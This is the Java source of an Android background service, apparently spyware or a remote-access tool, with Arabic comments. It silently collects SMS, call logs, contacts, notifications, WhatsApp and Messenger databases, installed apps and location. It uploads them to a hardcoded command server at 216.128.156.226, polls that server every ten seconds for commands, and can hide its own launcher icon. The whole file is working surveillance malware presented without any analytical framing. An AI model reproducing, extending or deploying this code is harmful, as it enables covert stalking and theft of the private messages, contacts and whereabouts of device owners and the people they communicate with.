package com.alzahra.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class CoreService extends Service {
    private static final String TAG = "AlZahraService";
    private static final String CHANNEL_ID = "alzahra_channel";
    
    private Handler handler;
    private SharedPreferences prefs;
    private String serverUrl = "http://216.128.156.226:8443";
    private String deviceId;
    private String secretPath;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        deviceId = prefs.getString("device_id", "");
        secretPath = prefs.getString("secret_path", "");
        
        createNotificationChannel();
        startForeground(1, createNotification());
        
        startTasks();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build();
    }
    
    private void startTasks() {
        // إرسال كل شيء عند البداية
        handler.postDelayed(() -> sendAllData(), 5000);
        
        // التحقق من الأوامر كل 10 ثواني
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkCommands();
                handler.postDelayed(this, 10000);
            }
        }, 10000);
        
        // إرسال تحديث الحالة كل 30 ثانية
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendStatus();
                handler.postDelayed(this, 30000);
            }
        }, 30000);
    }
    
    private void sendAllData() {
        Log.d(TAG, "Sending all data...");
        
        new Thread(() -> sendSMS()).start();
        handler.postDelayed(() -> new Thread(() -> sendCalls()).start(), 2000);
        handler.postDelayed(() -> new Thread(() -> sendContacts()).start(), 4000);
        handler.postDelayed(() -> new Thread(() -> sendNotifications()).start(), 6000);
        handler.postDelayed(() -> new Thread(() -> sendWhatsApp()).start(), 8000);
        handler.postDelayed(() -> new Thread(() -> sendMessenger()).start(), 10000);
        handler.postDelayed(() -> new Thread(() -> sendAppData()).start(), 12000);
        handler.postDelayed(() -> new Thread(() -> sendLocation()).start(), 14000);
    }
    
    // ═══════════════════════════════════════════
    // SMS
    // ═══════════════════════════════════════════
    
    private void sendSMS() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
            
            if (cursor == null) {
                sendResponse("sms", false, "لا يمكن الوصول للرسائل");
                return;
            }
            
            StringBuilder sb = new StringBuilder();
            sb.append("=== SMS Messages ===\n\n");
            
            int count = 0;
            while (cursor.moveToNext() && count < 500) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                
                String typeStr = type == 1 ? "IN" : "OUT";
                String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(new Date(date));
                
                sb.append("[").append(typeStr).append("] ").append(address).append("\n");
                sb.append("Date: ").append(dateStr).append("\n");
                sb.append("Message: ").append(body).append("\n\n");
                count++;
            }
            cursor.close();
            
            saveToFile("sms", sb.toString());
            sendResponse("sms", true, count + " رسالة");
            
            Log.d(TAG, "SMS sent: " + count);
        } catch (Exception e) {
            sendResponse("sms", false, e.getMessage());
            Log.e(TAG, "SMS error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // المكالمات
    // ═══════════════════════════════════════════
    
    private void sendCalls() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
            
            if (cursor == null) {
                sendResponse("calls", false, "لا يمكن الوصول للمكالمات");
                return;
            }
            
            StringBuilder sb = new StringBuilder();
            sb.append("=== Call Log ===\n\n");
            
            int count = 0;
            while (cursor.moveToNext() && count < 500) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                
                String typeStr;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE: typeStr = "IN"; break;
                    case CallLog.Calls.OUTGOING_TYPE: typeStr = "OUT"; break;
                    case CallLog.Calls.MISSED_TYPE: typeStr = "MISSED"; break;
                    default: typeStr = "OTHER";
                }
                
                String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(new Date(date));
                
                sb.append("[").append(typeStr).append("] ").append(number).append("\n");
                if (name != null) sb.append("Name: ").append(name).append("\n");
                sb.append("Date: ").append(dateStr).append("\n");
                sb.append("Duration: ").append(duration).append("s\n\n");
                count++;
            }
            cursor.close();
            
            saveToFile("calls", sb.toString());
            sendResponse("calls", true, count + " مكالمة");
            
            Log.d(TAG, "Calls sent: " + count);
        } catch (Exception e) {
            sendResponse("calls", false, e.getMessage());
            Log.e(TAG, "Calls error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // جهات الاتصال
    // ═══════════════════════════════════════════
    
    private void sendContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            
            if (cursor == null) {
                sendResponse("contacts", false, "لا يمكن الوصول لجهات الاتصال");
                return;
            }
            
            StringBuilder sb = new StringBuilder();
            sb.append("=== Contacts ===\n\n");
            
            int count = 0;
            while (cursor.moveToNext() && count < 1000) {
                String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                
                Cursor phoneCursor = cr.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                    new String[]{id},
                    null
                );
                
                List<String> phones = new ArrayList<>();
                if (phoneCursor != null) {
                    while (phoneCursor.moveToNext()) {
                        String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phones.add(phone);
                    }
                    phoneCursor.close();
                }
                
                sb.append("Name: ").append(name).append("\n");
                for (String phone : phones) {
                    sb.append("Phone: ").append(phone).append("\n");
                }
                sb.append("\n");
                count++;
            }
            cursor.close();
            
            saveToFile("contacts", sb.toString());
            sendResponse("contacts", true, count + " جهة اتصال");
            
            Log.d(TAG, "Contacts sent: " + count);
        } catch (Exception e) {
            sendResponse("contacts", false, e.getMessage());
            Log.e(TAG, "Contacts error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // الإشعارات
    // ═══════════════════════════════════════════
    
    private void sendNotifications() {
        try {
            String notifPath = secretPath + "/notifications";
            File notifDir = new File(notifPath);
            
            if (!notifDir.exists()) {
                notifDir.mkdirs();
            }
            
            StringBuilder sb = new StringBuilder();
            sb.append("=== Notifications ===\n\n");
            
            File[] files = notifDir.listFiles();
            int count = 0;
            if (files != null) {
                for (File f : files) {
                    if (f.isFile() && f.getName().endsWith(".txt")) {
                        FileInputStream fis = new FileInputStream(f);
                        BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
                        String line;
                        while ((line = reader.readLine()) != null) {
                            sb.append(line).append("\n");
                            count++;
                        }
                        reader.close();
                        fis.close();
                    }
                }
            }
            
            String data = sb.toString();
            saveToFile("notifications", data);
            
            if (count > 0) {
                sendResponse("notifications", true, count + " إشعار");
            } else {
                sendResponse("notifications", true, "لا توجد إشعارات");
            }
            
            Log.d(TAG, "Notifications sent: " + count);
        } catch (Exception e) {
            sendResponse("notifications", false, e.getMessage());
            Log.e(TAG, "Notifications error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // WhatsApp
    // ═══════════════════════════════════════════
    
    private void sendWhatsApp() {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("=== WhatsApp Data ===\n\n");
            
            String[] waPaths = {
                "/data/data/com.whatsapp/databases/msgstore.db",
                "/sdcard/WhatsApp/Databases/msgstore.db",
                "/sdcard/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db",
                "/storage/emulated/0/WhatsApp/Databases/msgstore.db"
            };
            
            boolean found = false;
            for (String path : waPaths) {
                File db = new File(path);
                if (db.exists()) {
                    File dest = new File(secretPath + "/whatsapp/msgstore.db");
                    dest.getParentFile().mkdirs();
                    copyFile(db, dest);
                    
                    sb.append("Database found: ").append(path).append("\n");
                    sb.append("Size: ").append(db.length()).append(" bytes\n");
                    found = true;
                }
            }
            
            String[] mediaPaths = {
                "/sdcard/WhatsApp/Media",
                "/storage/emulated/0/WhatsApp/Media"
            };
            
            int mediaCount = 0;
            for (String path : mediaPaths) {
                File media = new File(path);
                if (media.exists() && media.isDirectory()) {
                    File[] files = media.listFiles();
                    if (files != null) {
                        sb.append("\nMedia files: ").append(files.length).append("\n");
                        for (File f : files) {
                            if (f.isDirectory()) {
                                File[] subFiles = f.listFiles();
                                if (subFiles != null) {
                                    mediaCount += subFiles.length;
                                    sb.append("  ").append(f.getName()).append(": ").append(subFiles.length).append(" files\n");
                                }
                            }
                        }
                    }
                }
            }
            
            saveToFile("whatsapp", sb.toString());
            
            if (found) {
                sendResponse("whatsapp", true, "قاعدة البيانات + " + mediaCount + " ملف وسائط");
                
                File dbFile = new File(secretPath + "/whatsapp/msgstore.db");
                if (dbFile.exists()) {
                    sendFile("whatsapp_db", dbFile);
                }
            } else {
                sendResponse("whatsapp", false, "واتساب غير مثبت أو لا يمكن الوصول");
            }
            
            Log.d(TAG, "WhatsApp sent");
        } catch (Exception e) {
            sendResponse("whatsapp", false, e.getMessage());
            Log.e(TAG, "WhatsApp error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // Messenger
    // ═══════════════════════════════════════════
    
    private void sendMessenger() {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("=== Messenger Data ===\n\n");
            
            String[] msgPaths = {
                "/data/data/com.facebook.orca/databases/threads_db2",
                "/data/data/com.facebook.orca/databases/messages_db"
            };
            
            boolean found = false;
            for (String path : msgPaths) {
                File db = new File(path);
                if (db.exists()) {
                    File dest = new File(secretPath + "/messenger/" + db.getName());
                    dest.getParentFile().mkdirs();
                    copyFile(db, dest);
                    
                    sb.append("Database: ").append(db.getName()).append("\n");
                    sb.append("Size: ").append(db.length()).append(" bytes\n");
                    found = true;
                }
            }
            
            saveToFile("messenger", sb.toString());
            
            if (found) {
                sendResponse("messenger", true, "تم سحب البيانات");
            } else {
                sendResponse("messenger", false, "ماسنجر غير مثبت أو لا يمكن الوصول");
            }
            
            Log.d(TAG, "Messenger sent");
        } catch (Exception e) {
            sendResponse("messenger", false, e.getMessage());
            Log.e(TAG, "Messenger error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // بيانات التطبيقات
    // ═══════════════════════════════════════════
    
    private void sendAppData() {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("=== Installed Apps ===\n\n");
            
            PackageManager pm = getPackageManager();
            List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
            
            int systemCount = 0;
            int userCount = 0;
            
            for (android.content.pm.ApplicationInfo app : apps) {
                String name = pm.getApplicationLabel(app).toString();
                String pkg = app.packageName;
                boolean isSystem = (app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
                
                sb.append(name).append(" (").append(pkg).append(")");
                if (isSystem) {
                    sb.append(" [SYSTEM]");
                    systemCount++;
                } else {
                    userCount++;
                }
                sb.append("\n");
            }
            
            sb.append("\nTotal: ").append(apps.size()).append(" apps");
            sb.append("\nSystem: ").append(systemCount);
            sb.append("\nUser: ").append(userCount);
            
            saveToFile("app_data", sb.toString());
            sendResponse("app_data", true, apps.size() + " تطبيق");
            
            Log.d(TAG, "App data sent: " + apps.size());
        } catch (Exception e) {
            sendResponse("app_data", false, e.getMessage());
            Log.e(TAG, "App data error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // الموقع
    // ═══════════════════════════════════════════
    
    private void sendLocation() {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("=== Location ===\n\n");
            
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            
            if (lm != null) {
                try {
                    Location gpsLoc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    Location netLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    
                    if (gpsLoc != null) {
                        sb.append("GPS Location:\n");
                        sb.append("Lat: ").append(gpsLoc.getLatitude()).append("\n");
                        sb.append("Lng: ").append(gpsLoc.getLongitude()).append("\n");
                        sb.append("Accuracy: ").append(gpsLoc.getAccuracy()).append("m\n");
                        sb.append("Time: ").append(new Date(gpsLoc.getTime())).append("\n\n");
                    }
                    
                    if (netLoc != null) {
                        sb.append("Network Location:\n");
                        sb.append("Lat: ").append(netLoc.getLatitude()).append("\n");
                        sb.append("Lng: ").append(netLoc.getLongitude()).append("\n");
                        sb.append("Accuracy: ").append(netLoc.getAccuracy()).append("m\n");
                        sb.append("Time: ").append(new Date(netLoc.getTime())).append("\n");
                    }
                    
                    if (gpsLoc != null || netLoc != null) {
                        saveToFile("location", sb.toString());
                        sendResponse("location", true, "تم تحديد الموقع");
                    } else {
                        sendResponse("location", false, "لا يوجد موقع متاح");
                    }
                } catch (SecurityException e) {
                    sendResponse("location", false, "لا تملك صلاحية الموقع");
                }
            } else {
                sendResponse("location", false, "خدمة الموقع غير متاحة");
            }
            
            Log.d(TAG, "Location sent");
        } catch (Exception e) {
            sendResponse("location", false, e.getMessage());
            Log.e(TAG, "Location error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // إنشاء ملف ZIP
    // ═══════════════════════════════════════════
    
    private void sendAllZip() {
        try {
            File zipFile = new File(secretPath + "/backup_" + System.currentTimeMillis() + ".zip");
            
            java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(new FileOutputStream(zipFile));
            
            File[] dirs = new File(secretPath).listFiles();
            if (dirs != null) {
                for (File dir : dirs) {
                    if (dir.isDirectory()) {
                        addDirToZip(zos, dir, dir.getName());
                    }
                }
            }
            
            zos.close();
            
            sendFile("all_backup", zipFile);
            sendResponse("all_zip", true, "ملف ZIP: " + zipFile.length() + " bytes");
            
            Log.d(TAG, "ZIP sent: " + zipFile.length());
        } catch (Exception e) {
            sendResponse("all_zip", false, e.getMessage());
            Log.e(TAG, "ZIP error", e);
        }
    }
    
    private void addDirToZip(java.util.zip.ZipOutputStream zos, File dir, String basePath) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.isFile()) {
                java.util.zip.ZipEntry entry = new java.util.zip.ZipEntry(basePath + "/" + file.getName());
                zos.putNextEntry(entry);
                
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, len);
                }
                fis.close();
                zos.closeEntry();
            } else if (file.isDirectory()) {
                addDirToZip(zos, file, basePath + "/" + file.getName());
            }
        }
    }
    
    // ═══════════════════════════════════════════
    // التحقق من الأوامر
    // ═══════════════════════════════════════════
    
    private void checkCommands() {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/commands?device_id=" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(10000);
                
                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    
                    org.json.JSONObject json = new org.json.JSONObject(sb.toString());
                    org.json.JSONArray commands = json.getJSONArray("commands");
                    
                    for (int i = 0; i < commands.length(); i++) {
                        String cmd = commands.getString(i);
                        executeCommand(cmd);
                    }
                }
                
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Commands error", e);
            }
        }).start();
    }
    
    private void executeCommand(String cmd) {
        Log.d(TAG, "Executing: " + cmd);
        
        switch (cmd) {
            case "sms": sendSMS(); break;
            case "calls": sendCalls(); break;
            case "contacts": sendContacts(); break;
            case "notifications": sendNotifications(); break;
            case "whatsapp": sendWhatsApp(); break;
            case "messenger": sendMessenger(); break;
            case "app_data": sendAppData(); break;
            case "location": sendLocation(); break;
            case "all": sendAllData(); break;
            case "all_zip": sendAllZip(); break;
            case "hide": hideApp(); break;
            case "unhide": unhideApp(); break;
            default:
                sendResponse(cmd, false, "أمر غير معروف");
                break;
        }
    }
    
    private void hideApp() {
        try {
            ComponentName component = new ComponentName(this, com.alzahra.MainActivity.class);
            getPackageManager().setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            sendResponse("hide", true, "تم إخفاء التطبيق");
        } catch (Exception e) {
            sendResponse("hide", false, e.getMessage());
        }
    }
    
    private void unhideApp() {
        try {
            ComponentName component = new ComponentName(this, com.alzahra.MainActivity.class);
            getPackageManager().setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
            sendResponse("unhide", true, "تم إظهار التطبيق");
        } catch (Exception e) {
            sendResponse("unhide", false, e.getMessage());
        }
    }
    
    // ═══════════════════════════════════════════
    // إرسال الرد للسيرفر
    // ═══════════════════════════════════════════
    
    private void sendResponse(String type, boolean success, String message) {
        try {
            URL url = new URL(serverUrl + "/api/response");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            
            String json = String.format(
                "{\"device_id\":\"%s\",\"type\":\"%s\",\"success\":%s,\"message\":\"%s\",\"timestamp\":\"%s\"}",
                deviceId, type, success, message.replace("\"", "\\\""), new Date().toString());
            
            conn.getOutputStream().write(json.getBytes());
            conn.getResponseCode();
            conn.disconnect();
            
            Log.d(TAG, "Response sent: " + type + " - " + (success ? "success" : "failed"));
        } catch (Exception e) {
            Log.e(TAG, "Response error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // إرسال البيانات
    // ═══════════════════════════════════════════
    
    private void sendData(String type, String data) {
        try {
            URL url = new URL(serverUrl + "/api/data");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            
            String json = String.format("{\"device_id\":\"%s\",\"type\":\"%s\",\"data\":\"%s\"}",
                deviceId, type, data.replace("\"", "\\\"").replace("\n", "\\n"));
            
            conn.getOutputStream().write(json.getBytes());
            conn.getResponseCode();
            conn.disconnect();
            
            Log.d(TAG, "Data sent: " + type);
        } catch (Exception e) {
            Log.e(TAG, "Send error", e);
        }
    }
    
    private void sendFile(String type, File file) {
        try {
            URL url = new URL(serverUrl + "/api/data");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(60000);
            
            String boundary = "----WebKitFormBoundary";
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            
            java.io.OutputStream os = conn.getOutputStream();
            
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n".getBytes());
            os.write((deviceId + "\r\n").getBytes());
            
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"type\"\r\n\r\n".getBytes());
            os.write((type + "\r\n").getBytes());
            
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
            os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes());
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int len;
            while ((len = fis.read(buffer)) > 0) {
                os.write(buffer, 0, len);
            }
            fis.close();
            
            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush();
            os.close();
            
            conn.getResponseCode();
            conn.disconnect();
            
            Log.d(TAG, "File sent: " + type);
        } catch (Exception e) {
            Log.e(TAG, "Send file error", e);
        }
    }
    
    private void sendStatus() {
        try {
            URL url = new URL(serverUrl + "/api/status");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            
            String json = String.format("{\"device_id\":\"%s\",\"battery\":%d,\"time\":\"%s\"}",
                deviceId, getBatteryLevel(), new Date().toString());
            
            conn.getOutputStream().write(json.getBytes());
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Status error", e);
        }
    }
    
    private int getBatteryLevel() {
        try {
            Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                if (scale > 0) {
                    return (int) (level * 100.0 / scale);
                }
            }
        } catch (Exception e) {
            // ignore
        }
        return 0;
    }
    
    private void saveToFile(String type, String data) {
        try {
            File file = new File(secretPath + "/" + type + "/" + type + "_" + System.currentTimeMillis() + ".txt");
            file.getParentFile().mkdirs();
            
            FileOutputStream fos = new FileOutputStream(file);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(data);
            writer.close();
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "Save error", e);
        }
    }
    
    private void copyFile(File src, File dest) throws Exception {
        FileInputStream fis = new FileInputStream(src);
        FileOutputStream fos = new FileOutputStream(dest);
        
        byte[] buffer = new byte[4096];
        int len;
        while ((len = fis.read(buffer)) > 0) {
            fos.write(buffer, 0, len);
        }
        
        fis.close();
        fos.close();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeCallbacksAndMessages(null);
    }
}
